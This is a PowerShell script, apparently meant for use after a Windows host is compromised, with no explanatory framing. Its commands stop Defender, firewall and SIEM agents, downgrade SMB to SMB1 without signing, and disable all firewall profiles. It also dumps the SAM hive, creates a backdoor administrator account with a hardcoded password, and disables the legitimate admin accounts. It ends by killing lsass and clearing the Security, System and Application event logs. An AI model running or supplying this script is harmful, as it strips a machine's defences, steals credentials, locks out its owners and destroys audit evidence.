Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore
Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
Stop-Service -Name "WinDefend" -Force -ErrorAction Ignore
Stop-Service "W3SVC" -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
Set-MpPreference -DisableRealtimeMonitoring $true
#Stop-IISSite -Name "Default Web Site"
Invoke-Command  {reg export 'HKLM\SAM' C:\sam.reg}


$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
Remove-LocalGroupMember -Group "Administrators" -Member "algo"
Remove-LocalGroupMember -Group "Administrators" -Member "Administrator"
Disable-LocalUser -Name "algo"
Disable-LocalUser -Name "Administrator"

Stop-Process -Name "lsass" -ErrorAction Ignore

Clear-EventLog -LogName System
Clear-EventLog -LogName Application
Clear-EventLog -LogName Security
